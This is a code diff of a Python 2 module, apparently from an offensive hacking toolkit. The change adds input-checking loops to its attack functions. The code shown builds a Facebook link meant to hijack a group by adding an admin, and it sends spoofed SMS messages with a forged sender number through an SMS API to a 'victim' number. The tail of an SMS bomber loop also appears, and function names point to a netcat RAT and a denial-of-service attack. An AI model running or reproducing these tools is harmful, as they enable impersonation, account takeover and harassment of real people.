 #3
File filter...  
  53  core/onlen.py 
@@ -96,8 +96,20 @@ def netcat_rat():

def facebookgroup_hijack():
	print facebookgrouphijack_banner
	id_group = raw_input("ID Group [ex: 589101351254979]: ")
	id_user = raw_input("ID User [ex: 100004136748473]: ")
	while(True):
		id_group = raw_input("ID Group [ex: 589101351254979]: ")
		if(id_group == ""):
			print("ENTER THE GROUP ID PLEASE")
			continue
		id_user = raw_input("ID User [ex: 100004136748473]: ")
		if(id_user == ""):
			print("ENTER THE USER ID PLEASE")
			continue

		#If the program reaches this line, all info provided is good!
		break


	time.sleep(1.5)
	linkjack = 'https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange' % (id_group, id_user)
	print "[+] LINKJACK >>> https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (id_group, id_user)
@@ -131,14 +143,37 @@ def denialofservice_attack():

def sms_spoof_elk():
	print smsspoofelk_banner
	usernm = raw_input("Username: ")
	passwd = raw_input("Password: ")
	recipient = raw_input("To: ")
	sender = raw_input("From: ")
	messagetext = raw_input("Message: ")
	while(True):
		usernm = raw_input("Username: ")
		if(usernm == ""):
			print("PLEASE ENTER A USERNAME")
			continue
		passwd = raw_input("Password: ")
		if(passwd == ""):
			print("PLEASE ENTER A PASSWORD")
			continue
		recipient = raw_input("To: ")
		if(recipient == ""):
			print("PLEASE ENTER THE VICTIM PH. NO.")
			continue
		sender = raw_input("From: ")
		if(sender == ""):
			print("PLEASE ENTER THE SENDER PH. NO.")
			continue
		messagetext = raw_input("Message: ")
		if(messagetext == ""):
			print("PLEASE ENTER THE MESSAGE")
			continue

		#The program will reach here when everything goes fine
		break

	url = "https://api.46elks.com/a1/SMS"
	r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
	print r.json()
	try:
		print r.json()
	except:
		print ("ERROR OCCURED! This is probably because incorrect username and pass was supplied...")
	backtomenu_option()

def sms_bomber_jdid():
@@ -157,4 +192,4 @@ def sms_bomber_jdid():
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] Stopped...\033[0m")
	backtomenu_option() 
	backtomenu_option()
